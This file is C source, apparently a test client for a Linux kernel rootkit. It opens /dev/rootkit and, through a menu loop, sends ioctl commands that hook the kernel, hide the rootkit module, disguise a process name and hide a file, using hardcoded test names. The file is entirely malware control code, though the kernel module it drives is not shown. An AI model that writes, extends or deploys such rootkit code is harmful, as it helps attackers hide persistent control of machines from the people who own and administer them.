#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include "rootkit.h"

int main(void)
{
    int fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    struct masq_proc masq = {
        .new_name = "tes",
        .orig_name = "test"};

    struct masq_proc_req req = {
        .len = 1,
        .list = &masq};

    struct hided_file file = {
        .name = "test2.c"};
    while (1)
    {
        int choice;
        printf("Enter choice: ");
        scanf("%d", &choice);
        switch (choice)
        {
        case 0:
            close(fd);
            return 0;
            break;
        case 1: // IOCTL_MOD_HOOK
            ioctl(fd, IOCTL_MOD_HOOK);

            break;
        case 2: // IOCTL_MOD_HIDE
            ioctl(fd, IOCTL_MOD_HIDE);
            break;
        case 3: // IOCTL_MOD_MASQ
            if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0)
            {
                perror("ioctl");
                close(fd);
                return 1;
            }

            break;
        case 4: // IOCTL_FILE_HIDE

            if (ioctl(fd, IOCTL_FILE_HIDE, &file) < 0)
            {
                perror("ioctl");
                close(fd);
                return 1;
            }
            break;

        default:
            printf("Invalid choice\n");
            break;
        }
    }
    close(fd);

    return 0;
}